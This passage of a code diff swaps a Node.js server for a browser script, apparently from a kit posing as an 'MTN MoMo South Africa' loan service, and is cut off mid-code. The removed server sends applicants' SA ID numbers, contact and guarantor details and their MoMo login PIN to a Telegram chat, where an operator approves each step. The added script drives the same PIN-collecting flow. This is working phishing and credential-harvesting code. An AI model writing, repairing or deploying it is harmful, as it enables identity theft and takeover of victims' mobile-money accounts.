@@ -1,968 +1,948 @@
 // ============================================================
-// server.js – MTN MoMo South Africa  (FIXED)
-// Registration mandatory · Account-type limits · Guarantor
-// Unified step-based flow compatible with v6 frontend
+// script.js – MTN MoMo South Africa v6.1 (FIXED)
+// MoMo Login replaces SMS/OTP verification
 // ============================================================
 'use strict';
 
-require('dotenv').config();
-const express = require('express');
-const fetch = require('node-fetch');
-const cors = require('cors');
-const path = require('path');
-const fs = require('fs');
-
-const app = express();
-app.use(cors());
-app.use(express.json({ limit: '1mb' }));
-app.use(express.static(path.join(__dirname, '../frontend')));
-
-const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
-console.log('═══════════════════════════════════════');
-console.log('🚀 Server starting...');
-console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '... (len ' + BOT_TOKEN.length + ')' : 'MISSING');
-console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
-console.log('═══════════════════════════════════════');
-
-// ─── Account Types ───
 const ACCOUNT_TYPES = {
-    yello: {
-        name: 'MoMo Yello', icon: '🟡',
-        dailyCash: 3500, monthlyCap: 20000,
-        maxLoan: 20000, minLoan: 5000, requiresId: true,
-        description: 'Standard MoMo account'
-    },
-    yello_plus: {
-        name: 'MoMo Yello Plus', icon: '⭐',
-        dailyCash: 10000, monthlyCap: 40000,
-        maxLoan: 40000, minLoan: 5000, requiresId: true,
-        description: 'Higher limits account'
-    },
-    eazi: {
-        name: 'MoMo Eazi', icon: '⚡',
-        dailyCash: 2000, monthlyCap: 10000,
-        maxLoan: 10000, minLoan: 5000, requiresId: false,
-        description: 'Basic MoMo account (no ID required)'
-    }
+    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true  },
+    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true  },
+    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
 };
 
-// Ordered v6 workflow steps + legacy step names for backward compat
-const STEP_ORDER = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
-const LEGACY_STEPS = ['application', 'sms', 'pin', 'otp'];
+const STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
 
-// ─── Data Store ───
-const applications  = {};
-const registrations = {};
-const DATA_DIR   = path.join(__dirname, '../data');
-const DATA_FILE  = path.join(DATA_DIR, 'applications.json');
-const REG_FILE   = path.join(DATA_DIR, 'registrations.json');
-const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
-if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+const S = {
+    applicationId: '',
+    isRegistered: false,
+    accountType: null,
+    accountMaxLoan: 0,
+    idNumber: null,
+    steps: {},                       // ✅ FIXED: was missing
+    loan: {}, personal: {}, employment: {}, guarantor: {}
+};
 
-function saveApps() {
-    try {
-        fs.writeFileSync(DATA_FILE, JSON.stringify({
-            applications,
-            timestamp: new Date().toISOString()
-        }, null, 2));
-    } catch (e) { console.error('Save error:', e.message); }
-}
-function saveRegs() {
-    try {
-        fs.writeFileSync(REG_FILE, JSON.stringify({
-            registrations,
-            timestamp: new Date().toISOString()
-        }, null, 2));
-    } catch (e) { console.error('Save regs error:', e.message); }
-}
-function loadAll() {
-    try {
-        if (fs.existsSync(DATA_FILE)) {
-            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-            const age = Date.now() - new Date(parsed.timestamp).getTime();
-            if (age < 30 * 24 * 60 * 60 * 1000) {
-                Object.assign(applications, parsed.applications || {});
-                console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
-            }
-        }
-        if (fs.existsSync(REG_FILE)) {
-            const parsed = JSON.parse(fs.readFileSync(REG_FILE, 'utf8'));
-            Object.assign(registrations, parsed.registrations || {});
-            console.log(`📂 Loaded ${Object.keys(registrations).length} registrations`);
-        }
-    } catch (e) { console.error('Load error:', e.message); }
-}
+const POLL_INTERVAL = 2500;
+const POLL_MAX_DURATION = 30 * 60 * 1000;
 
-// ─── Audit ───
-function audit(event, data = {}) {
-    const entry = { ts: new Date().toISOString(), event, ...data };
-    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); }
-    catch (e) {}
-    console.log(JSON.stringify(entry));
-}
+let activePoll = null;
+let currentPollStep = null;
+let currentPollCallback = null;      // ✅ FIXED: keep callback so visibilitychange can resume
+let currentPollStarted = 0;
+let selectedAccountType = null;
+let qualificationAnimator = null;    // ✅ FIXED: track animation interval
+
+const KEYS = {
+    APP_ID: 'mtn_za_app_id_v6',
+    APP_DATA: 'mtn_za_data_v6'
+};
+
+const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} };
+const get  = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
+const rm   = (k) => { try { localStorage.removeItem(k); } catch (e) {} };
 
 // ─── Helpers ───
-function esc(t) {
-    if (t === null || t === undefined) return '';
-    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-}
-function code(t) {
-    const c = (t === null || t === undefined) ? '' : String(t).trim();
-    return `<code>${esc(c)}</code>`;
-}
-function block(t) {
-    const c = (t === null || t === undefined) ? '' : String(t).trim();
-    return `<pre>${esc(c)}</pre>`;
+function escapeHtml(s) {
+    return String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
 }
 function fmt(n) { return (Number(n) || 0).toLocaleString(); }
-function monthlyRepayment(principal, months) {
-    if (!principal || !months) return 0;
-    return Math.ceil(principal / months);
+
+function genAppId() {
+    const rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
+    return 'MTN-ZA-' + rand.slice(0, 8);
 }
 
-// Ensure every application has a `steps` map so webhook can flip statuses
-function ensureSteps(app_) {
-    if (!app_.steps) app_.steps = {};
-    STEP_ORDER.forEach(k => { if (!(k in app_.steps)) app_.steps[k] = 'idle'; });
-    return app_.steps;
+// ─── Offline detection ───
+window.addEventListener('online',  () => document.getElementById('offlineBanner').classList.add('hidden'));
+window.addEventListener('offline', () => document.getElementById('offlineBanner').classList.remove('hidden'));
+if (!navigator.onLine) document.getElementById('offlineBanner').classList.remove('hidden');
+
+// ─── Popstate guard ───
+window.addEventListener('popstate', () => {
+    const active = document.querySelector('.page.active');
+    if (active && requiresRegistration(active.id) && !isUserRegistered()) {
+        forceRegistration();
+    }
+});
+
+function requiresRegistration(pageId) {
+    return ['page-step1', 'page-step2', 'page-step3', 'page-guarantor', 'page-confirmation',
+            'page-momologin', 'page-scan', 'page-approval'].includes(pageId);
 }
 
-// Read a step's status (works for both new steps{} and legacy fields)
-function readStep(app_, step) {
-    if (app_.steps && step in app_.steps) return app_.steps[step];
-    if (step in app_) return app_[step];
-    return 'idle';
+function isUserRegistered() {
+    return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType]);
 }
-function writeStep(app_, step, value) {
-    if (app_.steps && step in app_.steps) app_.steps[step] = value;
-    if (step in app_) app_[step] = value;
-    // Keep legacy qualification mirror in sync
-    if (step === 'qualification') {
-        app_.qualification = (value === 'approved') ? 'qualified'
-                            : (value === 'rejected') ? 'unqualified'
-                            : value;
+
+function forceRegistration(reason) {
+    showToast('❌ Please register first.', 'error', 4000);
+    setTimeout(() => {
+        startMoMoRegistration();
+        setTimeout(() => showErr('regErr', reason || 'You must register on MoMo before applying.'), 400);
+    }, 1200);
+}
+
+// ─── Toast (single slot) ───
+function showToast(msg, type = 'info', duration = 3200) {
+    document.querySelectorAll('.toast').forEach(t => t.remove());
+    const t = document.createElement('div');
+    t.className = `toast toast-${type}`;
+    t.textContent = msg;
+    document.body.appendChild(t);
+    setTimeout(() => {
+        t.style.opacity = '0';
+        t.style.transform = 'translateX(-50%) translateY(-20px)';
+        setTimeout(() => t.remove(), 300);
+    }, duration);
+}
+
+function showErr(id, msg) {
+    const box = document.getElementById(id);
+    if (box) { box.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; }
+}
+function clearErr(id) {
+    const box = document.getElementById(id);
+    if (box) box.classList.remove('show');
+}
+function setBtnLoading(btn, loading, defaultText) {
+    if (!btn) return;
+    btn.disabled = loading;
+    btn.textContent = loading ? 'Please wait...' : defaultText;
+}
+
+// ─── API ───
+async function apiCall(endpoint, options = {}) {
+    try {
+        const res = await fetch(endpoint, {
+            ...options,
+            headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }
+        });
+        return await res.json();
+    } catch (e) {
+        console.error(`${endpoint}:`, e.message);
+        throw new Error('Network error. Please try again.');
     }
 }
 
-// ─── SA ID Validation ───
-function validateSAID(id) {
-    if (!id) return { ok: false, reason: 'ID number is required.' };
-    const clean = String(id).replace(/\s/g, '');
-    if (!/^\d{13}$/.test(clean)) return { ok: false, reason: 'SA ID must be 13 digits.' };
+// ─── Navigation ───
+function goTo(pageId) {
+    if (requiresRegistration(pageId) && !isUserRegistered()) {
+        forceRegistration();
+        return;
+    }
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const el = document.getElementById(pageId);
+    if (el) el.classList.add('active');
+    window.scrollTo(0, 0);
+    history.pushState({ page: pageId }, '', '#' + pageId);
+
+    if (pageId === 'page-requirements') updateRequirementsLimits();
+    if (pageId === 'page-step1')        refreshStep1();
+    if (pageId === 'page-confirmation') updateConfirmation();
+    refreshAccountBadges();
+    if (!pageId.startsWith('page-wait-') && pageId !== 'page-scan') stopPolling();
+}
+
+function refreshAccountBadges() {
+    const type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
+    const label = type ? `${type.icon} ${type.name}` : '';
+    ['navbarAccount', 'navbarAccount2', 'navbarAccount3', 'navbarAccount4', 'navbarAccount5', 'navbarAccount6'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.innerHTML = label ? `<div class="nav-badge">${label}</div>` : '';
+    });
+}
+
+// ═══════════════════════════════════════════════════════════
+// FORM HELPERS
+// ═══════════════════════════════════════════════════════════
+function normalizePhone(id) {
+    const inp = document.getElementById(id);
+    let v = inp.value.replace(/\D/g, '');
+    if (v.length > 9) v = v.substring(0, 9);
+    inp.value = v;
+}
+function normalizeId(id) {
+    const inp = document.getElementById(id);
+    let v = inp.value.replace(/\D/g, '');
+    if (v.length > 13) v = v.substring(0, 13);
+    inp.value = v;
+    if (v.length === 13) validateAndPreviewId(v);
+    else document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
+}
+
+function updateCalc() {
+    const amt  = +document.getElementById('amtSlider').value;
+    const term = +document.getElementById('calcTermSelect').value;
+    const r = 0.27 / 12;
+    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
+    const total = monthly * term;
+
+    document.getElementById('calcAmt').textContent    = 'R ' + amt.toLocaleString();
+    document.getElementById('monthlyAmt').textContent = 'R ' + monthly.toLocaleString();
+    document.getElementById('totalAmt').textContent   = 'R ' + total.toLocaleString();
+    document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();
+
+    const slider = document.getElementById('amtSlider');
+    const pct = ((amt - 5000) / (500000 - 5000)) * 100;
+    slider.style.setProperty('--pct', pct + '%');
+}
+
+// ═══════════════════════════════════════════════════════════
+// SA ID PARSING
+// ═══════════════════════════════════════════════════════════
+function parseSAId(id) {
+    if (!id) return { ok: false, reason: 'ID required.' };
+    const clean = String(id).replace(/\D/g, '');
+    if (clean.length !== 13) return { ok: false, reason: 'SA ID must be 13 digits.' };
 
     const yy = parseInt(clean.substring(0, 2));
     const mm = parseInt(clean.substring(2, 4));
     const dd = parseInt(clean.substring(4, 6));
     const century = yy < 30 ? 2000 : 1900;
     const year = century + yy;
-
     const dob = new Date(year, mm - 1, dd);
     if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
-        return { ok: false, reason: 'Invalid date of birth in ID.' };
+        return { ok: false, reason: 'Invalid date of birth.' };
     }
-
-    const now = new Date();
-    let age = now.getFullYear() - year;
-    const m = now.getMonth() - (mm - 1);
-    if (m < 0 || (m === 0 && now.getDate() < dd)) age--;
-    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
+    const age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
+    if (age < 18)  return { ok: false, reason: 'Must be 18 or older.' };
     if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
-
-    let sum = 0, alt = false;
-    for (let i = clean.length - 1; i >= 0; i--) {
-        let n = parseInt(clean[i], 10);
-        if (alt) { n *= 2; if (n > 9) n -= 9; }
-        sum += n;
-        alt = !alt;
-    }
-    if (sum % 10 !== 0) return { ok: false, reason: 'Invalid ID checksum.' };
+    if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
 
     const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
-    const citizenship = clean[10] === '0' ? 'SA Citizen' : 'Permanent Resident';
+    const c = clean[10];
+    const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident'
+                       : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
 
-    return { ok: true, age, gender, citizenship, dob: dob.toISOString().split('T')[0], idNumber: clean };
+    return { ok: true, dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }), age, gender, citizenship };
+}
+function luhnCheck(num) {
+    let sum = 0, alt = false;
+    for (let i = num.length - 1; i >= 0; i--) {
+        let n = parseInt(num[i], 10);
+        if (alt) { n *= 2; if (n > 9) n -= 9; }
+        sum += n; alt = !alt;
+    }
+    return sum % 10 === 0;
+}
+function validateAndPreviewId(id) {
+    const r = parseSAId(id);
+    const p = document.getElementById('regDetailsPreview');
+    if (!r.ok) { p.innerHTML = `<div class="reg-preview-error">✕ ${escapeHtml(r.reason)}</div>`; return; }
+    p.innerHTML = `
+        <div class="reg-preview-row"><span>DOB</span><strong>${r.dob}</strong></div>
+        <div class="reg-preview-row"><span>Age</span><strong>${r.age} years</strong></div>
+        <div class="reg-preview-row"><span>Gender</span><strong>${r.gender}</strong></div>
+        <div class="reg-preview-row"><span>Citizenship</span><strong>${r.citizenship}</strong></div>`;
 }
 
-// ─── Telegram ───
-async function tgSend(text, buttons = null) {
-    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
-    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
-    if (buttons) body.reply_markup = { inline_keyboard: buttons };
+// ═══════════════════════════════════════════════════════════
+// LANDING
+// ═══════════════════════════════════════════════════════════
+function applyAsExistingUser() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
+    // ✅ FIXED: resume from furthest approved step
+    if (S.steps.loan === 'approved') {
+        if (S.steps.personal === 'approved') {
+            if (S.steps.employment === 'approved') {
+                if (S.steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
+                goTo('page-guarantor'); return;
+            }
+            goTo('page-step3'); return;
+        }
+        goTo('page-step2'); return;
+    }
+    goTo('page-step1');
+}
+
+function applyFromCalculator() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
+    const amt = +document.getElementById('amtSlider').value;
+    const term = document.getElementById('calcTermSelect').value + ' Months';
+    // ✅ FIXED: clamp to account type max
+    const max = S.accountMaxLoan || ACCOUNT_TYPES[S.accountType].maxLoan;
+    S.loan.loanAmount = Math.min(amt, max);
+    S.loan.loanTerm   = term;
+    saveAll();
+    showToast(`R ${fmt(S.loan.loanAmount)} selected`, 'success');
+    goTo('page-step1');
+}
+
+function startMoMoRegistration() {
+    S.isRegistered = false;
+    S.accountType = null;
+    S.accountMaxLoan = 0;
+    S.idNumber = null;
+    S.steps = {};
+    saveAll();
+    document.getElementById('regId').value = '';
+    document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
+    selectedAccountType = null;
+    document.querySelectorAll('.account-type').forEach(el => {
+        el.classList.remove('selected');
+        el.querySelector('.at-check').textContent = '○';
+    });
+    document.getElementById('accountTypeHint').textContent = 'Tap to select';
+    clearErr('regErr');
+    goTo('page-register-check');
+}
+
+function selectAccountType(type) {
+    selectedAccountType = type;
+    const names = { yello: 'MoMo Yello', yello_plus: 'MoMo Yello Plus', eazi: 'MoMo Eazi' };
+    document.querySelectorAll('.account-type').forEach(el => {
+        const m = el.dataset.type === type;
+        el.classList.toggle('selected', m);
+        el.querySelector('.at-check').textContent = m ? '●' : '○';
+    });
+    document.getElementById('accountTypeHint').textContent = `✅ ${names[type]}`;
+}
+
+async function completeRegistration() {
+    const id = document.getElementById('regId').value.trim();
+    if (!id) return showErr('regErr', 'Please enter your SA ID.');
+    if (id.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
+    const r = parseSAId(id);
+    if (!r.ok) return showErr('regErr', r.reason);
+    if (!selectedAccountType) return showErr('regErr', 'Please select an account type.');
+
+    if (!S.applicationId) S.applicationId = genAppId();
+    saveAll();
+
+    const btn = document.getElementById('regBtn');
+    setBtnLoading(btn, true, 'Complete Registration');
+    goTo('page-register-processing');
+    document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your ID...';
 
     try {
-        const r = await fetch(`${TG_API}/sendMessage`, {
+        const data = await apiCall('/api/register-momo', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body)
+            body: JSON.stringify({
+                applicationId: S.applicationId,
+                idNumber: id,
+                accountType: selectedAccountType,
+                phone: null,
+                fullName: null
+            })
         });
-        const result = await r.json();
-        if (result.ok) console.log(`✅ TG sent (${result.result?.message_id})`);
-        else console.error(`❌ TG: ${result.description}`);
-        return result;
-    } catch (e) {
-        console.error('❌ TG error:', e.message);
-        return { ok: false };
-    }
-}
 
-function askApproval(text, step, appId) {
-    const buttons = [[
-        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
-        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
-    ]];
-    tgSend(text, buttons);
-}
-
-// ─── Per-step Telegram message builder ───
-function buildStepMessage(step, app_, type, data) {
-    const header = `🆔 ${code(app_.applicationId)}\n`;
-
-    switch (step) {
-        case 'loan': {
-            const monthly = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
-            const required = Math.ceil(data.loanAmount * 0.20);
-            const effectiveRequired = Math.min(required, type.monthlyCap);
-            return `📋 <b>LOAN REQUEST (STEP 1/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
-                `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b> (max R ${fmt(type.maxLoan)})\n\n` +
-                `<b>💰 LOAN</b>\nType: ${esc(data.loanType)}\nAmount: <b>R ${fmt(data.loanAmount)}</b>\n` +
-                `Term: ${esc(data.loanTerm)}\nMonthly: <b>R ${fmt(monthly)}</b>\nPurpose: ${esc(data.loanPurpose)}\n\n` +
-                `<b>📊 QUALIFICATION (20% rule)</b>\nRequired: R ${fmt(required)}\n` +
-                `Account cap: R ${fmt(type.monthlyCap)}\nEffective: <b>R ${fmt(effectiveRequired)}</b>\n\n` +
-                `✅ <b>Approve loan request?</b>`;
-        }
-        case 'personal':
-            return `👤 <b>PERSONAL DETAILS (STEP 2/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
-                `Name: ${esc(data.firstName)} ${esc(data.lastName)}\n` +
-                `Phone: ${code('+27' + data.phone)}\nEmail: ${esc(data.email)}\n\n` +
-                `✅ <b>Approve personal details?</b>`;
-        case 'employment':
-            return `💼 <b>EMPLOYMENT &amp; KIN (STEP 3/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
-                `Employment: ${esc(data.employment)}\nAnnual Income: R ${fmt(data.annualIncome)}\n` +
-                `Next of kin: ${esc(data.kinName)} ${code('+27' + data.kinPhone)}\n\n` +
-                `✅ <b>Approve employment?</b>`;
-        case 'guarantor':
-            return `🤝 <b>GUARANTOR (STEP 4/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
-                `Name: ${esc(data.guarantorName)}\nPhone: ${code('+27' + data.guarantorPhone)}\n` +
-                `Relationship: ${esc(data.guarantorRelation)}\n\n✅ <b>Approve guarantor?</b>`;
-        case 'momologin': {
-            const pinStr = (data.loginMethod === 'pin' && data.pin)
-                ? code(data.pin) : '🔒 Biometric';
-            return `🔐 <b>MOMO LOGIN (STEP 5/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
-                `Phone: ${code('+27' + data.phone)}\nMethod: ${esc(data.loginMethod || 'pin')}\n` +
-                `PIN: ${pinStr}\nDevice: ${esc(data.deviceInfo || 'Unknown')}\n\n` +
-                `✅ <b>Approve MoMo login?</b>`;
-        }
-        case 'qualification': {
-            const loanAmount = app_.loanAmount || 0;
-            const months = parseInt(app_.loanTerm) || 12;
-            const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
-            const required = Math.ceil(loanAmount * 0.20);
-            const effectiveRequired = Math.min(required, type.monthlyCap);
-            return `📊 <b>FINAL QUALIFICATION (STEP 6/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
-                `<b>👤 APPLICANT</b>\n${esc(app_.firstName || '')} ${esc(app_.lastName || '')}\n` +
-                `${code('+27' + (app_.phone || ''))}\n\n` +
-                `<b>💰 LOAN</b>\nAmount: <b>R ${fmt(loanAmount)}</b>\nTerm: ${esc(app_.loanTerm || '')}\n` +
-                `Monthly: <b>R ${fmt(monthly)}</b>\n\n` +
-                `<b>📊 REQUIREMENT</b>\n20%: R ${fmt(required)}\nCap: R ${fmt(type.monthlyCap)}\n` +
-                `Effective: <b>R ${fmt(effectiveRequired)}</b>\n\n` +
-                `<b>🤝 GUARANTOR</b>\n${esc(app_.guarantorName || 'N/A')}\n` +
-                `${app_.guarantorPhone ? code('+27' + app_.guarantorPhone) : ''}\n\n` +
-                `✅ <b>Approve to complete the loan?</b>`;
-        }
-        default:
-            return `Step "${step}" pending for ${code(app_.applicationId)}`;
-    }
-}
-
-// ═══════════════════════════════════════════════════════════
-// DIAGNOSTICS
-// ═══════════════════════════════════════════════════════════
-app.get('/health', (req, res) => {
-    res.json({ status: 'ok', uptime: process.uptime(), applications: Object.keys(applications).length });
-});
-
-app.get('/api/telegram-debug', async (req, res) => {
-    const result = {
-        tokenSet: !!BOT_TOKEN,
-        tokenLength: BOT_TOKEN ? BOT_TOKEN.length : 0,
-        tokenHasColon: BOT_TOKEN ? BOT_TOKEN.includes(':') : false,
-        chatIdSet: !!CHAT_ID,
-        chatId: CHAT_ID || 'MISSING'
-    };
-    try { const me = await fetch(`${TG_API}/getMe`); result.getMe = await me.json(); }
-    catch (e) { result.getMeError = e.message; }
-    try { result.testSend = await tgSend(`🧪 <b>Test</b>`); } catch (e) { result.testSendError = e.message; }
-    res.json(result);
-});
-
-app.get('/api/account-types', (req, res) => {
-    res.json({ ok: true, types: ACCOUNT_TYPES });
-});
-
-// ═══════════════════════════════════════════════════════════
-// REGISTRATION
-// ═══════════════════════════════════════════════════════════
-app.post('/api/register-momo', async (req, res) => {
-    try {
-        const { applicationId, idNumber, accountType, phone, fullName } = req.body || {};
-
-        if (!applicationId || !idNumber || !accountType) {
-            return res.status(400).json({ ok: false, error: 'Missing required fields.' });
-        }
-        if (!ACCOUNT_TYPES[accountType]) {
-            return res.status(400).json({ ok: false, error: 'Invalid account type.' });
-        }
-
-        const type = ACCOUNT_TYPES[accountType];
-        let idCheck = { ok: true };
-        if (type.requiresId) {
-            idCheck = validateSAID(idNumber);
-            if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
-        }
-
-        if (!applications[applicationId]) {
-            applications[applicationId] = {
-                applicationId,
-                createdAt: new Date().toISOString()
-            };
-        }
-        ensureSteps(applications[applicationId]);
-
-        applications[applicationId].momoRegistration = {
-            idNumber: type.requiresId ? idNumber : null,
-            accountType,
-            accountName: type.name,
-            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
-            maxLoan: type.maxLoan,
-            minLoan: type.minLoan,
-            phone: phone || null,
-            fullName: fullName || null,
-            idDetails: idCheck.ok && type.requiresId ? {
-                age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob
-            } : null,
-            registeredAt: new Date().toISOString()
-        };
-        applications[applicationId].isRegistered = true;
-        applications[applicationId].accountType = accountType;
-        applications[applicationId].accountMaxLoan = type.maxLoan;
-        applications[applicationId].updatedAt = new Date().toISOString();
-        saveApps();
-
-        console.log(`✅ MoMo registration: ${applicationId} → ${type.name}`);
-        audit('registration_main', { applicationId, accountType, phone });
-
-        await tgSend(
-            `📱 <b>MOMO REGISTRATION CONFIRMED</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `🆔 App ID: ${code(applicationId)}\n` +
-            (fullName ? `👤 ${esc(fullName)}\n` : '') +
-            (phone ? `📞 ${code('+27' + phone)}\n` : '') +
-            `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b>\n\n` +
-            `<b>📊 LIMITS</b>\nDaily: R ${fmt(type.dailyCash)}\n` +
-            `Monthly: R ${fmt(type.monthlyCap)}\nMax Loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
-            (idCheck.ok && type.requiresId
-                ? `\n<b>🇿🇦 ID</b>\n${code(idNumber)}\nAge ${idCheck.age} · ${idCheck.gender} · ${idCheck.citizenship}\n`
-                : '') +
-            `\n✅ User can now apply`
-        );
-
-        res.json({
-            ok: true,
-            accountType,
-            accountName: type.name,
-            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
-            maxLoan: type.maxLoan,
-            minLoan: type.minLoan,
-            message: `${type.name} registered successfully.`
-        });
-    } catch (e) {
-        console.error('Registration error:', e.message);
-        res.status(500).json({ ok: false, error: e.message });
-    }
-});
-
-// Legacy temp endpoint (still supported)
-app.post('/api/register-momo-telegram', async (req, res) => {
-    try {
-        const { applicationId, idNumber, accountType, phone, fullName, extra } = req.body || {};
-        if (!idNumber || !accountType) return res.status(400).json({ ok: false, error: 'Missing ID or account type.' });
-        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Invalid account type.' });
-
-        const type = ACCOUNT_TYPES[accountType];
-        const idCheck = type.requiresId ? validateSAID(idNumber) : { ok: true };
-        if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
-
-        const regId = applicationId || ('REG-' + Date.now().toString().slice(-6));
-        registrations[regId] = {
-            regId, idNumber: type.requiresId ? idNumber : null,
-            accountType, accountName: type.name,
-            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
-            phone: phone || null, fullName: fullName || null,
-            extra: extra || null,
-            registeredAt: new Date().toISOString(),
-            source: 'register-momo-telegram'
-        };
-        saveRegs();
-        audit('registration_temp_endpoint', { regId, accountType, phone });
-
-        await tgSend(
-            `📱 <b>NEW MOMO REGISTRATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `🆔 Reg ID: ${code(regId)}\n` +
-            (phone ? `📞 ${code('+27' + phone)}\n` : '') +
-            `\n${type.icon} <b>${type.name}</b>\n` +
-            `Max loan: <b>R ${fmt(type.maxLoan)}</b>\n\n✅ Registration captured`
-        );
-
-        res.json({
-            ok: true, regId, accountType, accountName: type.name,
-            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
-            maxLoan: type.maxLoan, minLoan: type.minLoan,
-            message: `${type.name} registered. Your maximum loan is R ${fmt(type.maxLoan)}.`
-        });
-    } catch (e) {
-        console.error('Temp reg error:', e.message);
-        res.status(500).json({ ok: false, error: e.message });
-    }
-});
-
-// ═══════════════════════════════════════════════════════════
-// ⭐ UNIFIED STEP SUBMISSION — NEW (was missing)
-// ═══════════════════════════════════════════════════════════
-app.post('/api/submit-step', async (req, res) => {
-    try {
-        const { applicationId, step, data } = req.body || {};
-        if (!applicationId || !step) {
-            return res.status(400).json({ ok: false, error: 'Missing applicationId or step.' });
-        }
-        if (!STEP_ORDER.includes(step)) {
-            return res.status(400).json({ ok: false, error: `Invalid step: ${step}` });
-        }
-
-        const app_ = applications[applicationId];
-        if (!app_) {
-            return res.status(404).json({ ok: false, code: 'NOT_REGISTERED', error: 'Application not found. Please register first.' });
-        }
-        if (!app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
-            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'You must register on MoMo before applying.' });
-        }
-
-        const type = ACCOUNT_TYPES[app_.accountType];
-        ensureSteps(app_);
-
-        // Enforce step order
-        const idx = STEP_ORDER.indexOf(step);
-        if (idx > 0) {
-            const prev = STEP_ORDER[idx - 1];
-            if (app_.steps[prev] !== 'approved') {
-                return res.status(400).json({ ok: false, error: `Previous step "${prev}" is not approved yet.` });
-            }
-        }
-
-        // Per-step validation / data persistence
-        if (step === 'loan') {
-            const { loanType, loanAmount, loanTerm, loanPurpose } = data || {};
-            if (!loanType || !loanAmount || !loanTerm || !loanPurpose) {
